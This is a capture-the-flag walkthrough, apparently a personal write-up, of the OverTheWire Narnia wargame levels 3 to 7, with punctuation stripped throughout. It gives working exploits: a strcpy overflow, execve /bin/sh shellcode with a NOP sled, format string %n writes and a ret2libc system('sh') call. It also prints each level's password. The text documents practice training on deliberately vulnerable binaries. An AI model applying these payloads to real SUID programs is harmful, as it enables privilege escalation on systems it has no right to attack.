narnia narnia3  etc narnia pass narnia3copied contents of  etc narnia pass narnia3 to a safer place      dev nullBreakpoint 1  0x0804860d in maingdb  x 100x  esp 1000xffffd4fc      0xf7fe818a      0xf7ffda7c      0xf7ffd000      0x0804825c0xffffd50c      0xf7ffd000      0x0804825c      0x00000001      0xf7e187b80xffffd51c      0xf7e53f7b      0xf7e1d068      0x00000002      0xf7fc50000xffffd52c      0xf7fe800b      0x00000000      0x00000002      0xf7fc50000xffffd53c      0xffffd5b8      0xf7fee710      0xf7fc6870      0xffffd5b80xffffd54c      0x00000000      0x7fffffb5      0xf7ee930c      0x0804860a0xffffd55c      0x00000003      0x71656176      0x7a656575      0xf70a65650xffffd56c      0xf7fd2e28      0xf7fc5000      0xffffd654      0xf7ffcd000xffffd57c      0x00200000      0x6374652f      0x72616e2f      0x5f61696e0xffffd58c      0x73736170      0x72616e2f      0x3361696e      0xffffd600   endhighlightLooking at the output  we can see that the address of the contents of the file matches the expected location of 0xffffd560  The contents of the file are read from right to left in memory  as this is in little endian   and are stored using their respective ascii values in hex  Converting this to ascii reveals that this password is vaequeezee  which matches the password of narnia3  However  attempting this same methodology on  etc narnia pass narnia4 does not workhighlight bash  gdb  r  etc narnia pass narnia4Starting program   narnia narnia3  etc narnia pass narnia4error opening  etc narnia pass narnia4 Inferior 1  process 26687  exited with code 0377    endhighlight Security Behind SUID DebuggingThe reason this does not work is due to the security risks involved with allowing a user to execute an SUID binary within a debugger  Essentially  if a user was allowed to execute a binary with permissions of another user  then they could easily modify a program to execute what they would likeDebuggers have to execute the ptrace  process trace  function call to trace a function  this is how debugging programs work   This function prevents execve system calls from elevating privileges on the system  as the privilege elevations flags are ignored  effectively making the user have the same privileges as he or she did before debugging  The only way to execute an SUID binary with the permissions of the effective user  is to run the program as rootBinary AnalysisSeeing as reading the narnia4 s password in the memory of the stack pointer was not successful  we can analyze the binary in Ghidra to see how it works and come up with a different methodology for exploitationhighlight bash void main int param 1 undefined4  param 2undefined local 5c  32   char local 3c  32   undefined4 local 1c  undefined4 local 18  undefined4 local 14  undefined4 local 10  int local c  int local 8local 1c   0x7665642f  local 18   0x6c756e2f  local 14   0x6c  local 10   0  if  param 1    2      printf  usage   s file  will send contents of file 2  dev nulln   param 2                        WARNING  Subroutine does not return      exit  1strcpy local 3c  char   param 2 1    local 8   open  char    local 1c 2   if  local 8   0      printf  error opening  sn   local 1c                        WARNING  Subroutine does not return      exit  1local c   open local 3c 0   if  local c   0      printf  error opening  sn  local 3c                        WARNING  Subroutine does not return      exit  1read local c local 5c 0x1f   write local 8 local 5c 0x1f   printf  copied contents of  s to a safer place      s n  local 3c  local 1c   close local c   close local 8                        WARNING  Subroutine does not return    exit 1endhighlightWe can see that the binary is providing 32 bytes to two different unidentified buffers defined as local 5c and local 3c  The program checks if an argument is sent  If not it will provide the usage  otherwise it will perform the strcpy function  a function used to copy strings   This is a dangerous function which can result in buffer overflows  Reading the man page of this function and going to the  Bugs  section  the following description can be readIf the destination string of a strcpy   is not large enough  then anything might happen  Overflowing fixed length string buffers is a favorite cracker technique for taking complete control of the machine  Any time a program reads or copies data into a buffer  the program first needs to check that there s enough space  This may be unnecessary if you can show that overflow is impossible  but be careful  programs can get changed over time  in ways that may make the impossible possibleFollowing the strcpy function are two if statements  one for checking if a file exists  and another for checking if we have valid permissions for opening the file  If the file exists and we have permissions for opening the file  then the read and write functions are executedBefore figuring out how to exploit the binary  we should first understand how it behaves by doing what the program expectshighlight bash narnia3 narnia     narnia narnia3  etc narnia pass narnia4copied contents of  etc narnia pass narnia4 to a safer place      dev null    endhighlightThe program can read the narnia4 password file and copy it to  dev null  However  due to this being the place in linux used for discarding data  we cannot recover the passwordExploiting strcpyGoing back to Ghidra  we can see that the  dev null device is set to the variable local 1c reports Narnia image10 png If there is a buffer overflow vulnerability we can possibly overwrite this local variable  When inputting many strings followed by the word  test   we can see that the program returns an error for opening the program  however not all of the A s that we sent are outputtedhighlight bash narnia3 narnia     narnia narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtesterror opening AAAAAAAAAAAAtest   endhighlightWe can try to create a file called AAAAAAAAAAAAtest and see how the binary respondshighlight bash narnia3 narnia  tmp  touch AAAAAAAAAAAAtestnarnia3 narnia  tmp  chmod 777 AAAAAAAAAAAAtestnarnia3 narnia  tmp   narnia narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest                                                                                    error opening AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest   endhighlightStrangely  the binary now spits out all the A s that we inputted  Recall that we found within Ghidra that 32 bytes are being allocated to two unknown buffers  It is possible that one of the buffers is meant for the name of the input file  while the other buffer is meant for the output  This means that upon creating a long named directory and inputting the full path of a file located within this directory might successfully overwrite the variable allocated for the  dev null device  This methodology was carried out as followshighlight bash narnia3 narnia  tmp  mkdir   python  c  print  S  26  narnia3 narnia  tmp  cd   python  c  print  S  26  narnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSS  touch testnarnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSS  chmod 777 test   endhighlightNote that a directory of 26 S s was created because  tmp  is 5 characters and the   at the end of the S directory is one character  6   26   32 which is the size allocated for the bufferExecuting the full path of the  test  file within this directory proves to successfully overwrite the null device variablehighlight bash narnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSS   narnia narnia3  tmp SSSSSSSSSSSSSSSSSSSSSSSSSS testcopied contents of  tmp SSSSSSSSSSSSSSSSSSSSSSSSS test to a safer place     test    endhighlightIt follows that if we create a  tmp directory within the current working directory and create a file that is symbolically linked to narnia4 s password file  we can copy his credentials to wherever we specifyhighlight bash narnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSS tmp   narnia narnia3  tmp SSSSSSSSSSSSSSSSSSSSSSSSSS tmp credentialserror opening tmp credentials   endhighlightThis error was included to further help in understanding how the binary worksThe error is missing a   at the beginning of the tmp directory  This is because  tmp  is four characters  S is 26 characters  and the trailing   is one character  which completely fills the 32 bytes allocated for the buffer   Therefore  the string after the trailing   of the S directory is what overwrites the variable for the null device  Creating a directory with 27 S s fixes this problem  note that the choice of S s was arbitrary  and any sequence of 27 bytes within the  tmp directory would have workedhighlight bash narnia3 narnia  tmp  mkdir   python  c  print  S  27  narnia3 narnia  tmp  cd   python  c  print  S  27  narnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS  mkdir tmpnarnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS  cd tmpnarnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS tmp  ln  s  etc narnia pass narnia4 credentialsnarnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS tmp   narnia narnia3  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS tmp credentialserror opening  tmp credentialsnarnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS tmp  touch  tmp credentialsnarnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS tmp  chmod 777  tmp credentialsnarnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS tmp   narnia narnia3  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS tmp credentialscopied contents of  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS tmp credentials to a safer place      tmp credentials narnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSSS tmp  cat  tmp credentialsthaenohtai   endhighlightThe password for the narnia4 user was successfully copied to the  tmp directory under the filename of credentialsSource Codehighlight c  include  stdio h  include  sys types h  include  sys stat h  include  fcntl h  include  unistd h  include  stdlib h                                                                                                                                                    include  string h                                                                                                                                                                                                                                                                                                                                      int main int argc  char   argvint  ifd   ofd    char ofile 16      dev null     char ifile 32     char buf 32     if argc    2         printf  usage   s file  will send contents of file 2  dev nulln  argv 0          exit  1            open files      strcpy ifile  argv 1      if  ofd   open ofile O RDWR     0          printf  error opening  sn   ofile         exit  1         if  ifd   open ifile  O RDONLY     0          printf  error opening  sn   ifile         exit  1            copy from file1 to file2      read ifd  buf  sizeof buf  1     write ofd buf  sizeof buf  1     printf  copied contents of  s to a safer place      s n  ifile ofile        close  em      close ifd     close ofd     exit 1endhighlightWe can see from the source code that the program is not checking for the size of the user input before running the strcpy function  The usage of the strcpy function should be avoided as it can result in a buffer overflow vulnerability   By inputting over 32 bytes to the ifile  the ofile variable  initialized to  dev null  was overwrittenNarnia 4As the narnia4 user  we can now running the narnia4 binary  However  when executing the binary  nothing happenshighlight bash narnia4 narnia  narnia    narnia4narnia4 narnia  narnia    endhighlightBinary AnalysisDownloading this binary and opening it up on Ghidra shows the following codehighlight c undefined4 main int param 1 int param 2   size t   n  char local 108  256   int local 8local 8   0  while    int    environ   local 8   4     0        n   strlen   char     environ   local 8   4      memset   void     environ   local 8   4  0   n     local 8   local 8   1    if  1   param 1      strcpy local 108   char     param 2   4      return 0endhighlightThe program is allocating 256 bytes to some variable and performing some innocuous operation on it inside the while loop  After doing so  the program runs an if statement which uses the dangerous strcpy function  see  Narnia 3   h ya2tytmk5a6Binary ExploitationWe can attempt to overflow the buffer by sending a large number of bytes in a pattern using pwndbg to determine where the eip offset ishighlight bash pwndbg  r   cyclic 500                                                               Starting program   home 0xd4y business other overthewire narnia 4 narnia4   cyclic 500Program received signal SIGSEGV  Segmentation fault                                   0x63616171 inpwndbg  cyclic  l 0x63616171                                                                                                                                                264                                                                                                                                                                           endhighlightTherefore  we can input a maximum of 264 bytes before overwriting the eip register  Thus  we can do just as we did in  Narnia 2   h e4mp3rcoeyar   and create a payload that will fill overwrite the eip register with an address that points to shellcode  9    ftnt9highlight bash pwndbg  r   python  c  print  A  264  B  4  x90  100  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80                                                                                                                                                               Starting program   home 0xd4y business other overthewire narnia 4 narnia4   python  c  print  A  264  B  4  x90  100  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80Program received signal SIGSEGV  Segmentation fault                                   0x42424242 inpwndbg  x 100x  esp 200                                                                                                                                                      0xffffcdf8      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce08      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce18      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce28      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce38      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce48      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce58      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce68      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce78      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce88      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffce98      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffcea8      0x41414141      0x41414141      0x41414141      0x41414141           0xffffceb8      0x41414141      0x42424242      0x90909090      0x90909090           0xffffcec8      0x90909090      0x90909090      0x90909090      0x90909090           0xffffced8      0x90909090      0x90909090      0x90909090      0x90909090           0xffffcee8      0x90909090      0x90909090      0x90909090      0x90909090           0xffffcef8      0x90909090      0x90909090      0x90909090      0x90909090           0xffffcf08      0x90909090      0x90909090      0x90909090      0x90909090           0xffffcf18      0x90909090      0x90909090      0x90909090      0x99580b6a            0xffffcf28      0x2d686652      0x52e18970      0x2f68686a      0x68736162           0xffffcf38      0x6e69622f      0x5152e389      0xcde18953      0x00000080                                                                                                    endhighlightWe can see that the NOP sled starts at 0xffffcec0  and the shellcode starts at 0xffffcf24  So the eip register can point to any address within the boundaries of these two address  the address of 0xffffcf08 was arbitrarily chosen  any address within the nop sled would workhighlight bash pwndbg  r   python  c  print  A  264  x08xcfxffxff  4  x90  100  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80                                                                                                                                               Starting program   home 0xd4y business other overthewire narnia 4 narnia4   python  c  print  A  264  x08xcfxffxff  4  x90  100  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80                                                                              endhighlight reports Narnia image11 png Expectedly  using this same methodology on the target machine results in successful exploitationhighlight bash  gdb  r   python  c  print  A  264   B  4  x90  100  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80                                                                                                                                                               Starting program   narnia narnia4   python  c  print  A  264   B  4  x90  100  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80Program received signal SIGSEGV  Segmentation fault 0x42424242 in       gdb  x 100x  esp 2000xffffd378      0x41414141      0x41414141      0x41414141      0x414141410xffffd388      0x41414141      0x41414141      0x41414141      0x414141410xffffd398      0x41414141      0x41414141      0x41414141      0x414141410xffffd3a8      0x41414141      0x41414141      0x41414141      0x414141410xffffd3b8      0x41414141      0x41414141      0x41414141      0x414141410xffffd3c8      0x41414141      0x41414141      0x41414141      0x414141410xffffd3d8      0x41414141      0x41414141      0x41414141      0x414141410xffffd3e8      0x41414141      0x41414141      0x41414141      0x414141410xffffd3f8      0x41414141      0x41414141      0x41414141      0x414141410xffffd408      0x41414141      0x41414141      0x41414141      0x414141410xffffd418      0x41414141      0x41414141      0x41414141      0x414141410xffffd428      0x41414141      0x41414141      0x41414141      0x414141410xffffd438      0x41414141      0x42424242      0x90909090      0x909090900xffffd448      0x90909090      0x90909090      0x90909090      0x909090900xffffd458      0x90909090      0x90909090      0x90909090      0x909090900xffffd468      0x90909090      0x90909090      0x90909090      0x909090900xffffd478      0x90909090      0x90909090      0x90909090      0x909090900xffffd488      0x90909090      0x90909090      0x90909090      0x909090900xffffd498      0x90909090      0x90909090      0x90909090      0x99580b6a0xffffd4a8      0x2d686652      0x52e18970      0x2f68686a      0x687361620xffffd4b8      0x6e69622f      0x5152e389      0xcde18953      0xf7fe00800xffffd4c8      0xffffd4cc      0xf7ffd920      0x00000002      0xffffd626   endhighlightSeeing as the NOP sled begins at 0xffffd440  and the shellcode begins at 0xffffd4a4  any address within the bounds of these two addresses will result in the execution of the shellcode  Using the same payload as the one on the attack box with the modification of the address surprisingly results in a  Segmentation faultnarnia4 narnia  narnia    narnia4   python  c  print  A  264  x58xd4xffxff  4  x90  100  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80   Segmentation faultThis was the same problem that occurred in Narnia 2  Just as we did in Narnia 2  tweaking the return address by slightly incrementing it results in the successful execution of the shellcodehighlight bash narnia4 narnia  narnia    narnia4   python  c  print  A  264    x90xd4xffxff  4  x90  100  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80   bash 4 4  whoaminarnia5bash 4 4  cat  etc narnia pass narnia5faimahchiy   endhighlightSource Codehighlight c  include  string h  include  stdlib h  include  stdio h  include  ctype hextern char   environ int main int argc char   argv     int i    char buffer 256     for i   0  environ i     NULL  i          memset environ i    0   strlen environ i       if argc 1        strcpy buffer argv 1      return 0endhighlightThe source code does not agree with what we saw in Ghidra  This is because Ghidra is converting the assembly instructions into c code  and for loops look similar to while loops  We can see from the source code that the program is setting 256 bytes to a buffer  and it is not performing any sort of boundary checks  10    ftnt10   a detection of the size of the input before it is usedNarnia 5After exploiting the narnia4 binary  we now have the necessary permissions to execute the narnia5 binaryBinary AnalysisWe can start by executing the narnia5 binary to see how it normally behaves reports Narnia image3 png We can see from the output that we are meant to change the value for the local variable called i  Furthermore  entering an input such as AAAA into the binary  we can see that the input gets reflected reports Narnia image5 png After fiddling around with the input  we can find that the buffer accepts a total of 63 bytes  We can analyze this binary further with Ghidrahighlight c undefined4 main undefined4 param 1 int param 2uid t   euid    uid t   ruid  size t sVar1  char local 4c  63   undefined local d  int local c   local c   1  snprintf local 4c 0x40   char     param 2   4    local d   0  printf  Change i s value from 1    500      if  local c    500      puts  GOOD        euid   geteuid        ruid   geteuid      setreuid   ruid   euid     system   bin sh      puts  No way   let me give you a hint     sVar1   strlen local 4c   printf  buffer     s    d n  local 4c sVar1   printf  i    d   p n  local c  local c   return 0endhighlightThere is a local c variable being set to 1  this is the i  and stays unchanged  We can see that there is an if statement  and within it  bin sh gets executed as the narnia6 user  However  due to the local c variable staying unchanged  the if statement is never run  From the code  we can deduce that there is a vulnerability in the following line  snprintf local 4c 0x40   char     param 2   4     This may be surprising  as the manual page for snprintf encourages its usageBUGS      Because sprintf   and vsprintf   assume an arbitrarily long string  callers must be careful not to overflow the actual space  this is often impossible to assure  Note that the length of the strings produced is locale de pendent and difficult to predict   Use snprintf   and vsnprintf   instead  or asprintf 3  and vasprintf 3   Code such as printf foo   often indicates a bug  since foo may contain a   character  If foo comes from un trusted user input  it may contain  n  causing the printf   call to write to memory and creating a security hole The security hole within this function lies in the fact that it uses a buffer of a fixed length with no boundary checks  11    ftnt11snprintf  is safe as you long as you provide the correct length for the buffer  snprintf does guarantee that the buffer won t be overwritten  but it does not guarantee null terminationFormat String ExploitTherefore  upon providing a format character such as  x  the function will spit out addresses from the stack POCnarnia5 narnia  narnia    narnia5  xChange i s value from 1    500  No way   let me give you a hint buffer    f7fc5000   8 i   1  0xffffd5f0Despite only providing  x as the input  we can see the buffer contains 8 bytes  The methodology behind a format string attack is finding the address of a local variable that we would like to overwrite  this is given to us as 0xffffd5f0   After discovering the address of the targeted variable  we need to determine where the input gets stored in memory  After finding this information  we can finally overwrite the variable by providing its address followed by the  n format specifierProviding the input string of AAAA followed by the  x format specifier  we can immediately see the position of the input in the stackhighlight bash narnia5 narnia  narnia    narnia5 AAAA xChange i s value from 1    500  No way   let me give you a hint buffer    AAAA41414141   12 i   1  0xffffd5f0    endhighlightTherefore  replacing AAAA with the address of the local i variable followed by the  n format specifier will successfully overwrite the variablehighlight bash narnia5 narnia  narnia    narnia5   python  c  print  xf0xd5xffxff n   Change i s value from 1    500  No way   let me give you a hint buffer       4 i   4  0xffffd5f0    endhighlightObserve that the value for the variable is 4 which matches the amount of bytes in the buffer  Therefore  the amount of bytes inside the buffer corresponds to the overwriting value for the variable Controlling Variable ValueAfter verifying the ability for overwriting the local variable  we are left with the task of controlling its value  This can be done by padding the buffer using two different methods  Method 1We can use a specifier for the position of the input within the stackhighlight bash narnia5 narnia  narnia    narnia5   python  c  print  xe0xd5xffxff    496x 1 n   Change i s value from 1    500  GOOD  whoaminarnia6   endhighlightIn the method above  the  1 specifies that the input is in position 1 within the stack  This method  however  is unstable in comparison to the second method  The payload used does not work when using single quotes around the input  rather only double quotes work  Method 2This method copies the address for the i variable twice before padding it with the necessary amount of bytes  Inputting the address twice was found to be necessary  after a lot of trial and errorhighlight bash narnia5 narnia  narnia   narnia narnia5   python  c  print  xd0xd5xffxffxd0xd5xffxff 492x n                                                                         Change i s value from 1    500  GOOD  cat  etc narnia pass narnia6neezocaeng   endhighlightSource Codehighlight c  include  stdio h  include  stdlib h  include  string hint main int argc  char   argv         int i   1        char buffer 64         snprintf buffer  sizeof buffer  argv 1          buffer sizeof  buffer    1    0        printf  Change i s value from 1    500            if i  500                 printf  GOODn          setreuid geteuid   geteuid                   system   bin sh                  printf  No way   let me give you a hint n          printf  buffer     s    d n   buffer  strlen buffer          printf   i    d   p n   i   i         return 0endhighlightNarnia 6Binary Analysis BehaviorGoing onto analysing the narnia6 binary  we can see that it expects two argumentshighlight bash narnia6 narnia  narnia    narnia6  narnia6 b1 b2   endhighlightWhen providing two normal inputs as arguments to the program  nothing out of the ordinary seems to happennarnia6 narnia  narnia    narnia6 A BA Ghidrahighlight c void main int param 1 undefined4  param 2size t sVar1  uint uVar2  uint uVar3    uid t   euid    uid t   ruid  char local 20  8   char local 18  8   code  local 10  int local clocal 10   puts  if  param 1    3      printf   s b1 b2n   param 2                        WARNING  Subroutine does not return      exit  1local c   0  while    int    environ   local c   4     0      sVar1   strlen   char     environ   local c   4      memset   void     environ   local c   4  0 sVar1     local c   local c   1local c   3  while  param 2 local c     0      sVar1   strlen  char   param 2 local c      memset  void   param 2 local c  0 sVar1     local c   local c   1strcpy local 18  char   param 2 1    strcpy local 20  char   param 2 2    uVar2    uint local 10   0xff000000  uVar3   get sp    if  uVar2    uVar3                         WARNING  Subroutine does not return      exit  1euid   geteuid      ruid   geteuid    setreuid   ruid   euid     local 10  local 18                        WARNING  Subroutine does not return    exit 1endhighlightEight bytes are allocated to buffers local 18 and local 20 which most likely correspond to the two arguments that the program expects  The program then performs harmless operations within the while loops  Eventually  the strcpy function is run on the two arguments as can be seen in the following lineshighlight c strcpy local 18  char   param 2 1   strcpy local 20  char   param 2 2    endhighlightWithin these two lines lie the vulnerability of the program  Eight bytes are being allocated to the local 18 and local 20 variables  which are then getting passed into the strcpy function with any kind of boundary checks being performed beforehand  The potential danger of this code is outlined within the  BUGS  subsection located in the manual page for the strcpy functionIf the destination string of a strcpy   is not large enough  then anything might happen  Overflowing fixed length string buffers is a favorite cracker technique for taking complete control of the machine  Any time a program reads or copies data into a buffer  the program first needs to check that there s enough space  This may be unnecessary if you can show that overflow is impossible  but be careful  programs can get changed over time  in ways that may make the impossible possibleAdditionally  it is important to check the security of the narnia6 binary with the checksec command to find binary security settingshighlight bash    0xd4y Writeup     business other overthewire narnia 6       checksec narnia6      home 0xd4y business other overthewire narnia 6 narnia6    Arch      i386 32 little   RELRO     No RELRO   Stack     No canary found   NX        NX enabled   PIE       No PIE  0x8048000    endhighlightThe NX bit is enabled  and therefore shellcode will be of no use for exploiting this program  However  this binary may be vulnerable to a ret2libc  return to lib c  attack  as well as to Return Oriented Programming  ROP   though the latter is untestedRet2libc AttackThis kind of attack is useful when exploiting a binary whose NX bit is enabled  but has a buffer overflow vulnerability  The attack works by replacing pointing the return address of the binary to a subroutine   function that is already present within the binary   12    ftnt12  Typically  the return address is replaced with an address pointing to the system function located within the stdlib library  as this is a function in c that executes system commands POCTo demonstrate the functionality of the system function  we can create a simple c program that runs the ls  la commandhighlight c  include  stdlib h int mainsystem  ls  la      return 0endhighlightCompiling and running this program  we see that it successfully executes the commandhighlight bash    0xd4y Writeup     business other overthewire narnia 6 poc       gcc poc c  o poc   0xd4y Writeup     business other overthewire narnia 6 poc         poctotal 24drwxr xr x 1 0xd4y 0xd4y    16 May 11 17 08  drwxr xr x 1 0xd4y 0xd4y   200 May 11 17 07    rwxr xr x 1 0xd4y 0xd4y 16608 May 11 17 08 poc rw r  r   1 0xd4y 0xd4y    71 May 11 17 07 poc c   endhighlightSeeing as we can ssh into the target machine with credentials that we have received from the previous task  we can compile this same code on the target system to determine the location of the system function in memory  in other words  we do not have to leak the system function s address   Using this address  we can point the address of the narnia6 binary to the system function and pass a command to it Determining System AddressFirst  we must compile the program in 32 bit format as followshighlight bash narnia6 narnia  tmp poc  gcc  m32 poc c  o pocnarnia6 narnia  tmp poc    poctotal 276drwxr sr x    2 narnia6 root   4096 May 11 18 15  drwxrws wt 2040 root    root 262144 May 11 18 15    rwxr xr x    1 narnia6 root   7460 May 11 18 15 poc rw r  r      1 narnia6 root     84 May 11 18 15 poc c   endhighlightAfter doing so  we can start debugging the program with gdbhighlight bash narnia6 narnia  tmp poc  gdb  q   poc                                                Reading symbols from   poc    no debugging symbols found    done  gdb  b  main                                                                                                                                                      Breakpoint 1 at 0x5a0                                                                  gdb  r                                                                              Starting program   tmp poc pocBreakpoint 1  0x565555a0 in main          gdb  disass main                    Dump of assembler code for function main    0x565555a0   0       lea    0x4  esp   ecx                                          0x565555a4   4       and     0xfffffff0  esp                    0x565555a7   7       pushl   0x4  ecx   0x565555aa   10      push    ebp        0x565555ab   11      mov     esp  ebp                                                0x565555ad   13      push    ebx                                                    0x565555ae   14      push    ecx        0x565555af   15      call   0x565555dc    x86 get pc thunk ax                       0x565555b4   20      add     0x1a4c  eax  0x565555b9   25      sub     0xc  esp  0x565555bc   28      lea     0x19a0  eax   edx                                      0x565555c2   34      push    edx                                                    0x565555c3   35      mov     eax  ebx    0x565555c5   37      call   0x56555400  system plt                                   0x565555ca   42      add     0x10  esp                                              0x565555cd   45      mov     0x0  eax  0x565555d2   50      lea     0x8  ebp   esp                                          0x565555d5   53      pop     ecx                                                    0x565555d6   54      pop     ebx        0x565555d7   55      pop     ebp      0x565555d8   56      lea     0x4  ecx   esp  0x565555db   59      ret       End of assembler dump              endhighlightNow with a breakpoint at main  we can see all of the corresponding addresses to each assembly instruction  Most notably  system call is at 0x565555c5 so it follows that we should set a breakpoint therehighlight bash  gdb  b  0x565555c5               Breakpoint 2 at 0x565555c5 gdb  cContinuingBreakpoint 2  0x565555c5 in main    gdb  x s  edx0x565555c5       ls  la    endhighlightWe can see that the ls  la command is in the edx register with an address of 0x565555c5  To get the address of the system function  we can simply type the following in the gdb consolehighlight bash  gdb  p system 1     text variable  no debug info   0xf7e4c850  system    endhighlightThe system is located at 0xf7e4c850 ExploitTherefore  we can flood the buffer with 8 bytes before overwriting the eip  Accordingly  the exploit will look like the followingCOMMAND   JUNK   x50xc8xe4xf7         JUNKUsing this exploit template  we can run the narnia6 binary in gdb and pass this payloadhighlight bash  gdb  r   python  c  print  ls   A  6  x50xc8xe4xf7       B  4  The program being debugged has been started already Start it from the beginning   y or n  yStarting program   narnia narnia6   python  c  print  ls   A  6  x50xc8xe4xf7       B  4  sh  1  lsAAAAAAP  not found Inferior 1  process 21970  exited with code 01    endhighlightNote how the command   the junk  namely  ls     A    6  is equal to eight bytesWe can see that the sh command is trying to execute lsAAAAAAP  which is not a command  However  this can be easily resolved by adding a semicolon to the end of the ls command using one less  Ahighlight bash  gdb  r   python  c  print  ls    A  5  x50xc8xe4xf7       B  4  Starting program   narnia narnia6   python  c  print  ls    A  5  x50xc8xe4xf7       B  4  narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8narnia0 c  narnia1 c  narnia2 c  narnia3 c  narnia4 c  narnia5 c  narnia6 c  narnia7 c  narnia8 csh  1  AAAAAP  not found Inferior 1  process 22579  exited with code 01    endhighlightThe ls command was successfully executed  Running the narnia6 binary outside of gdb and implementing the sh command instead  we get a shell as narnia7highlight bash narnia6 narnia  narnia    narnia6   python  c  print  sh    A  5  x50xc8xe4xf7       B  4    whoaminarnia7  cat  etc narnia pass narnia7ahkiaziphu   endhighlightSource Codehighlight c  include  stdio h  include  stdlib h  include  string hextern char   environ    tired of fixing values        morlaunsigned long get sp void           asm    movl  esp  eaxnt                and  0xff000000   eax                  int main int argc  char  argv           char b1 8   b2 8         int    fp  char     int    char     puts  i        if argc  3   printf   s b1 b2n   argv 0    exit  1              clear environ          for i 0  environ i     NULL  i                  memset environ i    0   strlen environ i              clear argz             for i 3  argv i     NULL  i                  memset argv i    0   strlen argv i           strcpy b1 argv 1          strcpy b2 argv 2            if   unsigned long fp   0xff000000     0xff000000        if   unsigned long fp   0xff000000     get sp                  exit  1         setreuid geteuid   geteuid       fp b1         exit 1endhighlightOnce again  Ghidra confused the for loop with a while loop  In any case  the operations within these loops were of no interest in regards to exploiting the binary  Note that the stdlib library was included in the binary which allowed us to use the system functionNarnia 7After grabbing the credentials of the narnia7 user  we can ssh into the box as the compromised user and access the narnia7 binaryBinary Analysis BehaviorWhen executing it  we are met with a prompt that expects an input as an argumenthighlight bash narnia7 narnia  narnia    narnia7Usage    narnia7  buffer    endhighlightPutting a simple input such as  A   we can see that nothing out of the ordinary occurshighlight bash narnia7 narnia  narnia    narnia7 Agoodfunction     0x80486ffhackedfunction     0x8048724before   ptrf     0x80486ff  0xffffd568 I guess you want to come to the hackedfunction   Welcome to the goodfunction  but i said the Hackedfunction   endhighlight GhidraThe program exits after printing out the above text  We can use Ghidra to further analyse how the binary functions reports Narnia image13 png There are four functions of interest within the program  main  vuln  goodfunction  and hackedfunction  The main function takes an argument as input and passes it onto the vuln function  This vuln function allocates 128 bytes to the argument  Going further down this function  we can see that the local 84 variable is being assigned to the address of goodfunctionLooking at the code for goofunction  we see that the function simply prints out a message and exits  Interestingly  toward the last line of the vuln function  the snprintf function is called and uses local 84 as an argument  Therefore  it can be deduced that this program is most likely vulnerable to a format string exploit  Seeing as hackedfunction calls  bin sh with setuid privileges  if the local 88 variable is overwritten to point to the address of hackedfunction  then we will receive a shell as the narnia8 userFormat String ExploitThe methodology to exploiting this binary is the same as the one outlined in  Narnia 2   h e4mp3rcoeyar   We can construct a payload that will look like the followingaddress to local 84     PADDINGxThe padding will correspond to the decimal value of the address for hackedfunction so as to overwrite the value of the local 84 with the appropriate address  Note that the program will convert this decimal value into hexadecimal  and the hackedfunction will therefore be executedFrom executing the binary  we saw that the hacked address is located at 0x8048724  Converting this hexadecimal value to decimal  we see that it is equivalent to 134514468  Furthermore  the binary printed out the value for local 84 at 0xffffd568  Therefore  a string comprised of the address to this variable in little endian format  as this binary is in little endian  followed by a padding of 134514468 will result in the execution of hackedfunctionhighlight bash narnia7 narnia  narnia    narnia7   python  c  print  x58xd5xffxff    134514468x n                                                                                     goodfunction     0x80486ffhackedfunction     0x8048724before   ptrf     0x80486ff  0xffffd558 I guess you want to come to the hackedfunction   Way to go      whoaminarnia8cat  